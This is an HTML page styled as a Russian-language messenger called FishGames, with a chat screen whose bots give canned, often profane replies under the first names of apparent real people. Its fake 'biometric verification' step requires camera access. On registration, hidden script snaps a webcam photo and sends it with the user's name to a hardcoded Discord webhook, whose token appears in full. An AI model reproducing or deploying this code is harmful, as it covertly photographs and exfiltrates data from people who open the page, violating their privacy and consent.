<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FishGamesMesenger</title>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); 
            color: white; display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; margin: 0; overflow: hidden; 
        }
        body::before {
            content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
            background: url('https://www.transparenttextures.com/patterns/waves.png');
            opacity: 0.15; animation: moveWaves 25s linear infinite; pointer-events: none;
        }
        @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }

        #vlad-scamer { position: fixed; inset: 0; background: black; z-index: 9999; display: none; justify-content: center; align-items: center; }
        #vlad-scamer img { width: 100vw; height: 100vh; object-fit: contain; }

        #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; z-index: 10; }
        
        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; background: #243b35; color: white; box-sizing: border-box; outline: none; margin-bottom: 12px; }
        .btn { width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }

        #messenger-screen { display: none; width: 95vw; height: 90vh; background: #1a2e2a; border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden; }
        .messenger-container { display: flex; height: 100%; }
        .sidebar { width: 280px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
        .search-input { background: none; border: 1px solid white; border-radius: 20px; padding: 8px; color: white; text-align: center; margin-bottom: 20px; }
        
        .contact-list { flex: 1; overflow-y: auto; }
        .contact-item { display: flex; align-items: center; gap: 12px; padding: 10px; cursor: pointer; border-radius: 10px; margin-bottom: 5px; }
        .contact-item:hover { background: rgba(34, 197, 94, 0.2); }
        
        /* Стиль аватарок */
        .avatar { 
            width: 45px; height: 45px; border-radius: 50%; 
            display: flex; align-items: center; justify-content: center; 
            font-weight: bold; border: 1px solid white; flex-shrink: 0; 
            overflow: hidden; background: #22c55e;
        }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }

        .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.1); }
        .chat-header { padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #2e8b57; color: #4ade80; }
        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; }
        .msg-incoming { align-self: flex-start; background: #2d4f47; color: white; }
        .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; border-top: 1px solid #2e8b57; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="vlad-scamer"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s"></div>

<div id="camera-overlay">
    <div class="warning-box">
        <h3>⚠️ FishGames SECURITY</h3>
        <p>Биометрическая верификация обязательна.</p>
        <button class="btn" onclick="requestAccess()">ВКЛЮЧИТЬ КАМЕРУ</button>
    </div>
</div>

<div id="reg-screen" class="reg-card" style="display:none;">
    <h2>FishGames</h2>
    <input type="text" id="firstname" placeholder="Имя">
    <input type="text" id="lastname" placeholder="Фамилия">
    <input type="text" id="login" placeholder="Логин">
    <button class="btn" onclick="register()">ВОЙТИ</button>
</div>

<div id="messenger-screen">
    <div class="messenger-container">
        <div class="sidebar">
            <input type="text" class="search-input" id="searchField" placeholder="поиск (Enter)" onkeypress="handleSearch(event)">
            <div class="contact-list" id="contacts">
                <div class="contact-item" onclick="openChat('Служба поддержки')">
                    <div class="avatar">⚙️</div><div>Служба поддержки</div>
                </div>
            </div>
            <div style="margin-top: auto; border-top: 1px solid #2e8b57; padding-top: 10px;">
                <div class="contact-item"><div class="avatar" id="my-ava" style="background:#008080">?</div><div id="my-name">Вы</div></div>
            </div>
        </div>
        <div class="chat-area">
            <div class="chat-header" id="chat-title">Выберите чат</div>
            <div class="messages-display" id="chat-box"></div>
            <div class="input-bar">
                <input type="text" id="messageText" placeholder="Напишите..." onkeypress="if(event.key==='Enter')sendMessage()">
                <button class="btn" style="width:60px;" onclick="sendMessage()">➤</button>
            </div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";

    // ПЕРСОНАЛЬНЫЕ АВАТАРКИ
    const avatars = {
        "тимофей": "https://i.redd.it/2z8x8zvo5wne1.png",
        "богдан": "https://www.meme-arsenal.com/memes/7f763e0b515cc10c21528b352319d07a.jpg",
        "ярослав": "https://yt3.googleusercontent.com/K24r2iIAEzeJsZKXva_IQMi5HePAEU8bIqCko4KcLvLlQjArn_PszAya4xgWFlUssdEQ0OPyrQ=s900-c-k-c0x00ffffff-no-rj",
        "богда": "https://www.meme-arsenal.com/memes/7f763e0b515cc10c21528b352319d07a.jpg"
    };

    let currentChat = "";
    let histories = { "Служба поддержки": [] };

    async function requestAccess() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            video.srcObject = s;
            document.getElementById('camera-overlay').style.display = 'none';
            document.getElementById('reg-screen').style.display = 'block';
        } catch(e) { alert("Камера обязательна!"); }
    }

    function register() {
        const fn = document.getElementById('firstname').value;
        if(!fn) return alert("Введите имя!");
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({ content: `✅ **Вход:** ${fn}` }));
            fd.append('file', b, 'user.png');
            fetch(webhook, {method: 'POST', body: fd});
        });
        document.getElementById('reg-screen').style.display = 'none';
        document.getElementById('messenger-screen').style.display = 'block';
        document.getElementById('my-name').innerText = fn;
        document.getElementById('my-ava').innerText = fn[0].toUpperCase();
        openChat('Служба поддержки');
    }

    function handleSearch(e) {
        if(e.key === 'Enter') {
            const val = document.getElementById('searchField').value.trim();
            const lowVal = val.toLowerCase();
            if(lowVal === "влад") { document.getElementById('vlad-scamer').style.display = 'flex'; return; }
            
            if(val.length >= 2 && !histories[val]) {
                histories[val] = [];
                const item = document.createElement('div');
                item.className = 'contact-item';
                item.onclick = () => openChat(val);
                
                // Проверка на наличие аватарки
                const avaSrc = avatars[lowVal];
                const avaHTML = avaSrc ? `<img src="${avaSrc}">` : val[0].toUpperCase();
                
                item.innerHTML = `<div class="avatar">${avaHTML}</div><div>${val}</div>`;
                document.getElementById('contacts').appendChild(item);
                document.getElementById('searchField').value = '';
                openChat(val);
            }
        }
    }

    function openChat(name) {
        currentChat = name;
        document.getElementById('chat-title').innerText = name;
        const box = document.getElementById('chat-box'); box.innerHTML = '';
        (histories[name] || []).forEach(m => renderMessage(m.text, m.type));
    }

    function renderMessage(text, type) {
        const box = document.getElementById('chat-box');
        const m = document.createElement('div'); m.className = 'msg-bubble ' + type;
        m.innerText = text; box.appendChild(m); box.scrollTop = box.scrollHeight;
    }

    function sendMessage() {
        const inp = document.getElementById('messageText');
        const txt = inp.value.trim(); if(!txt || !currentChat) return;
        renderMessage(txt, ''); histories[currentChat].push({text: txt, type: ''});
        inp.value = ''; setTimeout(() => botReply(txt), 1000);
    }

    function botReply(userText) {
        let reply = "";
        const txt = userText.toLowerCase();
        const name = currentChat.toLowerCase();
        const isToxic = ["блять", "сука", "хуй", "пидор", "еблан", "чмо", "говно", "отстой"].some(word => txt.includes(word));

        if (name === "богдан" || name === "богда") {
            if (txt.includes("студи") || txt.includes("плейс")) reply = "Не, я пасс. В Студию не полезу, там Луа опять лагает. Я с мопсом полежу.";
            else if (txt.includes("мопс")) reply = "Мопс — единственный, кто меня понимает. Он не просит дебажить.";
            else reply = "Да кодю потихоньку, проект на коленке собираю. А ты че?";
        }
        else if (name === "ярослав") {
            if (txt.includes("фембой")) {
                if (isToxic) reply = "ТЫ ЧЕ СУКА СКАЗАЛ?! Еще раз про фембоев так напишешь — я тебя из жизни вычеркну, еблан!";
                else reply = "Фембои — это база. Уважаю за понимание.";
            } else if (isToxic) reply = "Слышь, блять, фильтруй базар. Я сегодня не в духе.";
            else reply = "Здорово. Че хотел? Опять хуйню какую-то писать будешь?";
        }
        else if (name === "тимофей") {
            if (txt.includes("привет") || txt.includes("ку")) reply = "О, ку! Че делаешь? Я вот в Студии пытаюсь шейдеры настроить.";
            else if (txt.includes("нет") || txt.includes("не")) reply = "Вечно ты сливаешься... Я тебе тут топовый плейс предлагаю делать, а ты... Понятно.";
            else if (txt.includes("студи") || txt.includes("роблокс")) reply = "Заходи в Roblox Studio, я там такой паркур заскриптовал, го тестить!";
            else reply = "Слушай, когда в Студию? Надо GUI допилить и спавны расставить. Го?";
        }

        if (!reply) {
            const r = ["Ясно...", "Ахаха, ну ты выдал.", "Мда...", "Жиза.", "Рил ток.", "База.", "Че серьезно?", "Пойду поем."];
            reply = r[Math.floor(Math.random()*r.length)];
        }

        renderMessage(reply, 'msg-incoming');
        histories[currentChat].push({text: reply, type: 'msg-incoming'});
    }
</script>
</body>
</html>
